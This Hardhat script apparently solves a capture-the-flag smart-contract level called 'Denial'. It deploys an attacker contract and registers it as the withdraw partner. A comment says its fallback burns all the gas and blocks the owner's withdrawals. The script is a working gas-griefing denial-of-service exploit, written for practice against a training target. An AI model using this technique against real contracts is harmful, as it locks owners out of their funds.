const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0x3F44784Fe74b574679C93F79Af2CBd8E9ee3e1Fe";
  const DenialContract = await ethers.getContractFactory("Denial");
  const Denial = DenialContract.attach(Instance);
  const AttackDenialContract = await ethers.getContractFactory("AttackDenial");
  const AttackDenial = await AttackDenialContract.deploy();
  await AttackDenial.deployed();
  const contractBalance = await Denial.contractBalance();
  console.log(ethers.utils.formatEther(contractBalance));
  const tx = await Denial.setWithdrawPartner(AttackDenial.address);
  await tx.wait(1);
  const partner = await Denial.partner();
  // fallback function in the AttackDenial Contract will consume all the gas & make the withdraw not possible for the owner..
  console.log(partner, AttackDenial.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
